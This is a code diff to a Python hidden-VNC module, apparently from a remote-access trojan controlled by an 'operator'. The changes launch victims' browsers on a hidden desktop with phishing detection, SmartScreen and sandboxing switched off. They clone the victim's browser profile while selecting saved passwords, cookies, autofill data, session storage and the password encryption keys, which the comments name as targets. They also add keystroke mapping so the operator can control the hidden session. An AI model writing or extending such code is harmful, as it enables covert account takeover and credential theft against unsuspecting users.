@@ -52,7 +52,8 @@ if platform.system() == "Windows":
     
     GMEM_MOVEABLE = 0x0002
 
-# Browser profile paths
+# Browser profile paths and launch configurations
+# Extended args for stability: disable GPU issues, sync, background networking
 BROWSER_PROFILES = {
     "chrome": {
         "paths": [
@@ -62,7 +63,17 @@ BROWSER_PROFILES = {
             r"C:\Program Files\Google\Chrome\Application\chrome.exe",
             r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
         ],
-        "args": ["--user-data-dir={profile_dir}", "--no-first-run", "--no-default-browser-check"],
+        "args": [
+            "--user-data-dir={profile_dir}",
+            "--no-first-run",
+            "--no-default-browser-check",
+            "--disable-sync",
+            "--disable-background-networking",
+            "--disable-client-side-phishing-detection",
+            "--disable-component-update",
+            "--no-sandbox",  # Required for hidden desktop
+            "--disable-gpu",  # Avoid GPU issues on hidden desktop
+        ],
     },
     "firefox": {
         "paths": [
@@ -82,7 +93,18 @@ BROWSER_PROFILES = {
             r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
             r"C:\Program Files\Microsoft\Edge\Application\msedge.exe",
         ],
-        "args": ["--user-data-dir={profile_dir}", "--no-first-run", "--no-default-browser-check"],
+        "args": [
+            "--user-data-dir={profile_dir}",
+            "--no-first-run",
+            "--no-default-browser-check",
+            "--disable-sync",
+            "--disable-background-networking",
+            "--disable-client-side-phishing-detection",
+            "--disable-component-update",
+            "--no-sandbox",
+            "--disable-gpu",
+            "--disable-features=msSmartScreenProtection",  # Disable SmartScreen
+        ],
     },
     "opera": {
         "paths": [
@@ -93,7 +115,14 @@ BROWSER_PROFILES = {
             r"C:\Program Files (x86)\Opera\opera.exe",
             os.path.expandvars(r"%LOCALAPPDATA%\Programs\Opera\opera.exe"),
         ],
-        "args": ["--user-data-dir={profile_dir}", "--no-first-run"],
+        "args": [
+            "--user-data-dir={profile_dir}",
+            "--no-first-run",
+            "--disable-sync",
+            "--disable-background-networking",
+            "--no-sandbox",
+            "--disable-gpu",
+        ],
     },
     "brave": {
         "paths": [
@@ -103,7 +132,15 @@ BROWSER_PROFILES = {
             r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe",
             r"C:\Program Files (x86)\BraveSoftware\Brave-Browser\Application\brave.exe",
         ],
-        "args": ["--user-data-dir={profile_dir}", "--no-first-run", "--no-default-browser-check"],
+        "args": [
+            "--user-data-dir={profile_dir}",
+            "--no-first-run",
+            "--no-default-browser-check",
+            "--disable-sync",
+            "--disable-background-networking",
+            "--no-sandbox",
+            "--disable-gpu",
+        ],
     },
 }
 
@@ -234,6 +271,16 @@ class HVNCActions:
         Args:
             browser: Browser name (chrome, firefox, edge, opera, brave)
             clone_profile: Whether to clone the user's browser profile
+            
+        Profile cloning copies ONLY essential files for fast, non-blocking operation:
+        - Login Data: saved passwords
+        - Cookies: session cookies
+        - Local State: encryption keys
+        - Web Data: autofill data
+        - Local Storage: site data
+        - IndexedDB: site databases
+        
+        Large files like cache are EXCLUDED to keep cloning fast.
         """
         if not self.is_active:
             return {
@@ -282,36 +329,136 @@ class HVNCActions:
                     temp_dir = tempfile.mkdtemp(prefix=f"hvnc_{browser_lower}_")
                     profile_dir = temp_dir
                     
-                    # Copy profile (this can be slow for large profiles)
-                    logger.info("Cloning %s profile to %s", browser, temp_dir)
+                    # Copy profile incrementally (fast, non-blocking)
+                    logger.info("Cloning %s profile to %s (incremental)", browser, temp_dir)
                     
-                    # For Chrome-based browsers, copy specific folders
+                    # For Chrome-based browsers, copy ONLY essential files
                     if browser_lower in ("chrome", "edge", "brave", "opera"):
                         src_default = os.path.join(original_profile, "Default")
                         if os.path.exists(src_default):
                             dst_default = os.path.join(temp_dir, "Default")
-                            shutil.copytree(src_default, dst_default, 
-                                          ignore=shutil.ignore_patterns(
-                                              "Cache", "Code Cache", "GPUCache",
-                                              "*.log", "*.tmp"
-                                          ))
-                        # Copy Local State
+                            os.makedirs(dst_default, exist_ok=True)
+                            
+                            # Essential files for passwords, cookies, sessions
+                            essential_files = [
+                                "Login Data",           # Saved passwords
+                                "Login Data-journal",   # Password journal
+                                "Cookies",              # Session cookies
+                                "Cookies-journal",      # Cookie journal
+                                "Web Data",             # Autofill data
+                                "Web Data-journal",     # Autofill journal
+                                "Preferences",          # Browser preferences
+                                "Secure Preferences",   # Secure prefs
+                                "Bookmarks",            # Bookmarks
+                                "History",              # Browser history
+                                "Favicons",             # Site favicons
+                            ]
+                            
+                            # Copy essential files
+                            for fname in essential_files:
+                                src_file = os.path.join(src_default, fname)
+                                if os.path.exists(src_file):
+                                    try:
+                                        shutil.copy2(src_file, os.path.join(dst_default, fname))
+                                        logger.debug("Copied %s", fname)
+                                    except Exception as e:
+                                        logger.debug("Could not copy %s: %s", fname, e)
+                            
+                            # Copy Local Storage directory (site data)
+                            local_storage_src = os.path.join(src_default, "Local Storage")
+                            if os.path.exists(local_storage_src):
+                                try:
+                                    shutil.copytree(
+                                        local_storage_src,
+                                        os.path.join(dst_default, "Local Storage"),
+                                        ignore=shutil.ignore_patterns("*.log")
+                                    )
+                                    logger.debug("Copied Local Storage")
+                                except Exception as e:
+                                    logger.debug("Could not copy Local Storage: %s", e)
+                            
+                            # Copy IndexedDB directory (site databases)
+                            indexeddb_src = os.path.join(src_default, "IndexedDB")
+                            if os.path.exists(indexeddb_src):
+                                try:
+                                    shutil.copytree(
+                                        indexeddb_src,
+                                        os.path.join(dst_default, "IndexedDB"),
+                                        ignore=shutil.ignore_patterns("*.log")
+                                    )
+                                    logger.debug("Copied IndexedDB")
+                                except Exception as e:
+                                    logger.debug("Could not copy IndexedDB: %s", e)
+                            
+                            # Copy Session Storage (for tabs)
+                            session_storage_src = os.path.join(src_default, "Session Storage")
+                            if os.path.exists(session_storage_src):
+                                try:
+                                    shutil.copytree(
+                                        session_storage_src,
+                                        os.path.join(dst_default, "Session Storage"),
+                                        ignore=shutil.ignore_patterns("*.log")
+                                    )
+                                    logger.debug("Copied Session Storage")
+                                except Exception as e:
+                                    logger.debug("Could not copy Session Storage: %s", e)
+                            
+                            # Copy Extensions directory
+                            extensions_src = os.path.join(src_default, "Extensions")
+                            if os.path.exists(extensions_src):
+                                try:
+                                    shutil.copytree(
+                                        extensions_src,
+                                        os.path.join(dst_default, "Extensions"),
+                                    )
+                                    logger.debug("Copied Extensions")
+                                except Exception as e:
+                                    logger.debug("Could not copy Extensions: %s", e)
+                        
+                        # Copy Local State (encryption keys - CRITICAL for passwords)
                         local_state = os.path.join(original_profile, "Local State")
                         if os.path.exists(local_state):
                             shutil.copy2(local_state, temp_dir)
+                            logger.debug("Copied Local State (encryption keys)")
+                    
                     else:
-                        # Firefox - copy entire profile
-                        for item in os.listdir(original_profile):
+                        # Firefox - copy essential profile files
+                        firefox_essential_files = [
+                            "logins.json",          # Saved passwords
+                            "key4.db",              # Password encryption key
+                            "cert9.db",             # Certificates
+                            "cookies.sqlite",       # Cookies
+                            "places.sqlite",        # Bookmarks and history
+                            "prefs.js",             # Preferences
+                            "formhistory.sqlite",   # Form autofill
+                            "permissions.sqlite",   # Site permissions
+                            "content-prefs.sqlite", # Content preferences
+                            "webappsstore.sqlite",  # Local storage
+                        ]
+                        
+                        for item in firefox_essential_files:
                             src = os.path.join(original_profile, item)
-                            dst = os.path.join(temp_dir, item)
-                            if os.path.isdir(src):
-                                shutil.copytree(src, dst,
-                                              ignore=shutil.ignore_patterns("cache2", "*.log"))
-                            else:
-                                shutil.copy2(src, dst)
+                            if os.path.exists(src):
+                                try:
+                                    shutil.copy2(src, os.path.join(temp_dir, item))
+                                    logger.debug("Copied %s", item)
+                                except Exception as e:
+                                    logger.debug("Could not copy %s: %s", item, e)
+                        
+                        # Copy storage directory
+                        storage_src = os.path.join(original_profile, "storage")
+                        if os.path.exists(storage_src):
+                            try:
+                                shutil.copytree(
+                                    storage_src,
+                                    os.path.join(temp_dir, "storage"),
+                                    ignore=shutil.ignore_patterns("*.log", "cache*")
+                                )
+                            except Exception as e:
+                                logger.debug("Could not copy storage: %s", e)
                     
                     self._temp_profiles.append(temp_dir)
-                    logger.info("Profile cloned to %s", temp_dir)
+                    logger.info("Profile cloned incrementally to %s", temp_dir)
             
             # Build command
             args = []
@@ -624,15 +771,28 @@ class HVNCActions:
             elif msg_type == "key_down":
                 key = payload.get("key", "")
                 if key:
-                    self._session.key_down(key)
+                    vk_code = self._key_to_vk(key)
+                    if vk_code:
+                        self._session.key_down(vk_code)
+                    else:
+                        # If not a special key, type as text
+                        if len(key) == 1:
+                            self._session.type_text(key)
             elif msg_type == "key_up":
                 key = payload.get("key", "")
                 if key:
-                    self._session.key_up(key)
+                    vk_code = self._key_to_vk(key)
+                    if vk_code:
+                        self._session.key_up(vk_code)
             elif msg_type == "keypress":
                 key = payload.get("key", "")
                 if key:
-                    self._session.key_press(key)
+                    vk_code = self._key_to_vk(key)
+                    if vk_code:
+                        self._session.key_down(vk_code)
+                        self._session.key_up(vk_code)
+                    elif len(key) == 1:
+                        self._session.type_text(key)
             elif msg_type in ("text", "text_input"):
                 text = payload.get("text", "")
                 if text:
@@ -645,6 +805,75 @@ class HVNCActions:
         except Exception as exc:
             logger.warning("HVNC control error: %s", exc)
             return False
+    
+    def _key_to_vk(self, key: str) -> int | None:
+        """Convert key code string to Windows virtual key code.
+        
+        Args:
+            key: Key code string (e.g., "KeyA", "Enter", "Backspace")
+            
+        Returns:
+            Virtual key code or None if not a special key
+        """
+        # Key code to VK mapping
+        key_map = {
+            # Letters
+            "KeyA": 0x41, "KeyB": 0x42, "KeyC": 0x43, "KeyD": 0x44,
+            "KeyE": 0x45, "KeyF": 0x46, "KeyG": 0x47, "KeyH": 0x48,
+            "KeyI": 0x49, "KeyJ": 0x4A, "KeyK": 0x4B, "KeyL": 0x4C,
+            "KeyM": 0x4D, "KeyN": 0x4E, "KeyO": 0x4F, "KeyP": 0x50,
+            "KeyQ": 0x51, "KeyR": 0x52, "KeyS": 0x53, "KeyT": 0x54,
+            "KeyU": 0x55, "KeyV": 0x56, "KeyW": 0x57, "KeyX": 0x58,
+            "KeyY": 0x59, "KeyZ": 0x5A,
+            # Numbers
+            "Digit0": 0x30, "Digit1": 0x31, "Digit2": 0x32, "Digit3": 0x33,
+            "Digit4": 0x34, "Digit5": 0x35, "Digit6": 0x36, "Digit7": 0x37,
+            "Digit8": 0x38, "Digit9": 0x39,
+            # Function keys
+            "F1": 0x70, "F2": 0x71, "F3": 0x72, "F4": 0x73,
+            "F5": 0x74, "F6": 0x75, "F7": 0x76, "F8": 0x77,
+            "F9": 0x78, "F10": 0x79, "F11": 0x7A, "F12": 0x7B,
+            # Control keys
+            "Enter": 0x0D, "Return": 0x0D,
+            "Tab": 0x09,
+            "Space": 0x20,
+            "Backspace": 0x08,
+            "Delete": 0x2E,
+            "Insert": 0x2D,
+            "Home": 0x24,
+            "End": 0x23,
+            "PageUp": 0x21,
+            "PageDown": 0x22,
+            "Escape": 0x1B,
+            # Arrow keys
+            "ArrowUp": 0x26, "ArrowDown": 0x28,
+            "ArrowLeft": 0x25, "ArrowRight": 0x27,
+            # Modifiers
+            "ShiftLeft": 0xA0, "ShiftRight": 0xA1,
+            "ControlLeft": 0xA2, "ControlRight": 0xA3,
+            "AltLeft": 0xA4, "AltRight": 0xA5,
+            "MetaLeft": 0x5B, "MetaRight": 0x5C,
+            # Special
+            "CapsLock": 0x14,
+            "NumLock": 0x90,
+            "ScrollLock": 0x91,
+            "PrintScreen": 0x2C,
+            "Pause": 0x13,
+            # Numpad
+            "Numpad0": 0x60, "Numpad1": 0x61, "Numpad2": 0x62, "Numpad3": 0x63,
+            "Numpad4": 0x64, "Numpad5": 0x65, "Numpad6": 0x66, "Numpad7": 0x67,
+            "Numpad8": 0x68, "Numpad9": 0x69,
+            "NumpadMultiply": 0x6A, "NumpadAdd": 0x6B,
+            "NumpadSubtract": 0x6D, "NumpadDecimal": 0x6E, "NumpadDivide": 0x6F,
+            "NumpadEnter": 0x0D,
+            # Punctuation
+            "Semicolon": 0xBA, "Equal": 0xBB, "Comma": 0xBC,
+            "Minus": 0xBD, "Period": 0xBE, "Slash": 0xBF,
+            "Backquote": 0xC0, "BracketLeft": 0xDB, "Backslash": 0xDC,
+            "BracketRight": 0xDD, "Quote": 0xDE,
+        }
+        
+        return key_map.get(key)
     
     def handle_action(self, action: str, payload: dict) -> dict:
         """Handle HVNC action from operator.
